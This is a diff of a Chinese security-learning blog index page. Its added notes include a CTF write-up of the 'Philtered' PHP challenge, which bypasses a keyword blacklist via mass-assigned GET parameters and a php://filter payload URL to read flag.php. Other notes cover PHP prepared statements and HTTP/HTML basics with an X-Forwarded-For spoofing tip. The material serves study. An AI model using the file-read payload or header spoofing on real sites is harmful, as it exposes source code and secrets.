&lt;li&gt;Email: info&lt;/li&gt;</span></span><br><span class="line"><span class="string">    &lt;li&gt;Please don&#x27;t talk to us, we don&#x27;t like it&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;/ul&gt;</span></span><br><span class="line"><span class="string">HTML</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">render_layout</span>(<span class="string">&#x27;Philtered - Home&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>class config</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="string">&#x27;information.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data_folder</span> = <span class="string">&#x27;data/&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单的配置类，初始情况下会读取 <code>data/information.txt</code>。</p>
+<h5 id="php-config"><a href="#php-config" class="headerlink" title="php config"></a>php config</h5><p>在 PHP 中，config（或configuration）通常是指<strong>用于存储应用程序配置信息的文件或变量</strong>。 这些配置信息可以包括数据库连接信息、API密钥、常量、目录路径、系统设置等。 将这些信息保存在单独的配置文件中，可以使应用程序更易于维护和扩展。 通过分离配置信息和代码，可以减少在代码中硬编码的值，并且可以更容易地更改配置信息，而不需要修改代码。</p>
+<p><code>class Fileloader</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$allow_unsafe</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blacklist</span> = [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;etc&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>默认 <code>allow_unsafe</code> 为 <code>false</code>，黑名单包含常见敏感词：<code>php</code>, <code>filter</code>, <code>flag</code>, <code>..</code>, <code>etc</code>, <code>/</code>, <code>\\</code></p>
+<p>这些词如果出现在 URL 中的任何参数值中，就会被视为非法。</p>
+<p>写了一个过滤函数<code>contains_blacklisted_term()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">contains_blacklisted_term</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;allow_unsafe) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;blacklist <span class="keyword">as</span> <span class="variable">$term</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>, <span class="variable">$term</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>allow_unsafe=false</code>检测是否出现敏感关键字</p>
+<p><code>stripos()</code>是大小写不敏感的匹配</p>
+<h5 id="关键注入点assign-props"><a href="#关键注入点assign-props" class="headerlink" title="关键注入点assign_props():"></a>关键注入点<code>assign_props()</code>:</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$loader</span>-&gt;<span class="title function_ invoke__">assign_props</span>(<span class="variable">$_GET</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>assign_props()</code>:允许URL参数修改类属性</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="comment">// 处理 config[path]、config[data_folder]</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$value</span> <span class="keyword">as</span> <span class="variable">$subKey</span> =&gt; <span class="variable">$subValue</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>-&gt;<span class="variable">$key</span>, <span class="variable">$subKey</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">contains_blacklisted_term</span>(<span class="variable">$subValue</span>)) &#123;</span><br><span class="line">                    <span class="variable">$subValue</span> = <span class="string">&#x27;philtered.txt&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;<span class="variable">$subKey</span> = <span class="variable">$subValue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">contains_blacklisted_term</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&#x27;philtered.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="输出点："><a href="#输出点：" class="headerlink" title="输出点："></a>输出点：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;config-&gt;data_folder . <span class="variable">$this</span>-&gt;config-&gt;path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content .= &quot;<span class="tag">&lt;<span class="name">p</span>&gt;</span>&quot; . $loader-&gt;load() . &quot;<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>已知flag在flag.php里面</p>
+<p>构造payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/index.php?allow_unsafe=1&amp;config[data_folder]=php://filter/convert.base64-encode/resource=&amp;config[path]=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>最终会拼接成：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="php-MySQL语句预编译"><a href="#php-MySQL语句预编译" class="headerlink" title="php MySQL语句预编译"></a>php MySQL语句预编译</h2><p>预处理语句对于防止MySQL注入非常有用。</p>
+<p>预处理语句用于执行多个相同的sql语句，并且效率更高。</p>
+<p>预处理语句的工作原理如下：</p>
+<ol>
+<li><p>预处理：创建SQL语句模版并发送到数据库，预留的值使用”?”标记。例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>数据库解析，编译，对SQL语句模版执行查询优化，并储存结果不输出。</p>
+</li>
+<li><p>执行：最后将应用绑定的值传参给参数(“?”标记)，数据库执行语句。如果参数的值不一样，应用可以多次执行语句。</p>
+</li>
+</ol>
+<h6 id="相比于直接执行SQL语句，预编译语句有以下几个优点："><a href="#相比于直接执行SQL语句，预编译语句有以下几个优点：" class="headerlink" title="相比于直接执行SQL语句，预编译语句有以下几个优点："></a>相比于直接执行SQL语句，预编译语句有以下几个优点：</h6><ol>
+<li><p><strong>SQL结构和数据分离。</strong></p>
+<p>所以参数作为数据传入数据库，不会被当作SQL语句的一部分解释执行。</p>
+</li>
+<li><p>预处理语句大大减少了分析时间，只做了一次查询</p>
+</li>
+<li><p>绑定参数减少了服务器的带宽，只需要传参而不是整个语句</p>
+</li>
+<li><p>参数值发送后使用不同协议，保证数据的合法性</p>
+</li>
+</ol>
+<p>来看一个预编译的典例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>发送SQL模板</p>
+<p><code>$stmt = $conn-&gt;prepare(&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;);</code></p>
+<p>MySQL接受到这个SQL模板后，会进行一次语法检查和编译，生成执行计划(execution plan)</p>
+<p>这个时候，参数的的位置”?”只是占位符，不包含任何实际用户数据</p>
+</li>
+<li><p>绑定参数</p>
+<p><code>$stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</code></p>
+<p>数据库接受到参数后，会当做<strong>纯数据</strong>处理，即使参数中包含SQL特殊字符也不会被执行</p>
+<p>因为此时数据库不会在重新解析语句，只是将数据填入执行计划中</p>
+</li>
+<li><p>执行语句</p>
+<p><code>$stmt-&gt;execute();</code></p>
+<p>填充参数后，服务器按照既定的执行计划执行查询。</p>
+</li>
+</ol>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2025/02/08/php/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
 
   
     <article id="post-SQL注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
@@ -430,7 +945,15 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><p>http请求分为：</p>
+    <h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><p>week1：</p>
+<p>1.HTTP是什么</p>
+<p>超文本传输协议，一个简单的请求-响应协议</p>
+<p>2.URL是什么</p>
+<p>统一资源定位符，网址，用于指定网络上资源的位置和访问方式</p>
+<p>3.HTTP请求包的结构有哪几部分组成</p>
+<p>请求行、请求头部、空行、请求数据。</p>
+<p>4.常见的请求头有哪些？它们有什么作用？</p>
+<p>http请求分为：</p>
 <p>请求头：包括请求方法，版本等</p>
 <p>请求体：</p>
 <p>发给repeater（重发器）后可以右键改变请求方式,发送请求包。</p>
@@ -439,9 +962,131 @@
 <p>​    application&#x2F;xfu:是发送a&#x3D;2之类的表单</p>
 <p>​    application&#x2F;xfu(raw):可以传图片，文件头（十六进制数）</p>
 <p>​    application&#x2F;json</p>
-    
-    <a class="article-more-a" href="/2025/01/24/http/#more">more >></a>
-    
+<p>​     </p>
+<p>Cookie:一般是象征身份的随机字符</p>
+<p>xff: 127.0.0.1（ 主机环回地址，可以自己发给自己 ）</p>
+<p>控制台按F2可以看到二维数组</p>
+<p>302是重定向，可以在repeater中follow</p>
+<p>方法：</p>
+<p>get post put delete head(与GET相比，没有响应体，只有存活判断)</p>
+<p>可以自定义</p>
+<p>hackerbar可以发post的json（可选）,但是方法可以被bp再修改</p>
+<p>然后看看repeater</p>
+<p>能看到的都是前端</p>
+<p>服务器是后端</p>
+<p>F12可以看源代码（前端）</p>
+<p>ctrl+u可以看html</p>
+<p>俩<scrip>之间的才是js，其他都是html</p>
+<p>html是大的框架（提供元素），jss是干正式的(?)，css用于美化网页</p>
+<p>js会看就行（bushi）</p>
+<p>js重点：</p>
+<p>1.事件监听（一定要会）</p>
+<p>2.选取html的元素，添加或修改属性值</p>
+<p>3.创建html标签，增加属性，并追加DOM</p>
+<p>HTML 元素（可嵌套）</p>
+<table>
+<thead>
+<tr>
+<th align="left">开始标签 *</th>
+<th align="left">元素内容</th>
+<th align="left">结束标签 *</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><p></td>
+<td align="left">这是一个段落</td>
+<td align="left"></p></td>
+</tr>
+<tr>
+<td align="left"><a href="default.htm"></td>
+<td align="left">这是一个链接</td>
+<td align="left"></a></td>
+</tr>
+<tr>
+<td align="left"><br></td>
+<td align="left">换行</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h2 id="HTML-文档实例"><a href="#HTML-文档实例" class="headerlink" title="HTML 文档实例"></a>HTML 文档实例</h2><!DOCTYPE html>
+<html>
+
+
+
+<body>
+
+<p>这是第一个段落。</p>
+
+</body>
+
+</html>
+
+<ol>
+<li><p><strong><code>id</code></strong>: 给元素一个唯一的标识符，可以用于 CSS 选择器或 JavaScript 操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;header&quot;&gt;This is a header&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>class</code></strong>: 给元素指定一个或多个类名，方便通过 CSS 或 JavaScript 操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p class=&quot;text-muted&quot;&gt;This is a paragraph.&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>style</code></strong>: 直接为元素定义 CSS 样式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;span style=&quot;color: red;&quot;&gt;This text is red.&lt;/span&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>href</code></strong>: 用于 <code>&lt;a&gt;</code> 标签，指定链接目标。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;https://www.example.com&quot;&gt;Visit Example&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>src</code></strong>: 用于 <code>&lt;img&gt;</code> 和 <code>&lt;script&gt;</code> 标签，指定资源的路径。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;image.jpg&quot; alt=&quot;Description&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>alt</code></strong>: 用于 <code>&lt;img&gt;</code> 标签，提供图片的替代文本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;logo.png&quot; alt=&quot;Company Logo&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>title</code></strong>: 提供关于元素的额外信息，通常在鼠标悬停时显示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button title=&quot;Click me&quot;&gt;Submit&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>name</code></strong>: 在 <code>&lt;input&gt;</code>, <code>&lt;form&gt;</code>, <code>&lt;select&gt;</code> 等表单元素中使用，定义元素的名称。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>value</code></strong>: 定义表单元素的值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; value=&quot;Default text&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>target</code></strong>: 用于 <code>&lt;a&gt;</code> 标签，指定链接的打开方式（如 <code>_blank</code> 在新窗口中打开）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;https://www.example.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Open in new tab&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>type</code></strong>: 指定表单元素的类型（如 <code>text</code>, <code>password</code>, <code>submit</code>）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>placeholder</code></strong>: 为 <code>&lt;input&gt;</code> 和 <code>&lt;textarea&gt;</code> 提供一个占位符文本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; placeholder=&quot;Enter your name&quot;&gt;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<table>
+<thead>
+<tr>
+<th align="left">标签</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><html></td>
+<td align="left">定义 HTML 文档</td>
+</tr>
+<tr>
+<td align="left"><body></td>
+<td align="left">定义文档的主体</td>
+</tr>
+<tr>
+<td align="left"><h1>-<h6></td>
+<td align="left">定义 HTML 标题</td>
+</tr>
+<tr>
+<td align="left"><hr></td>
+<td align="left">定义水平线</td>
+</tr>
+<tr>
+<td align="left"><!--...--></td>
+<td align="left">定义注释</td>
+</tr>
+</tbody></table>
+
     
 
     
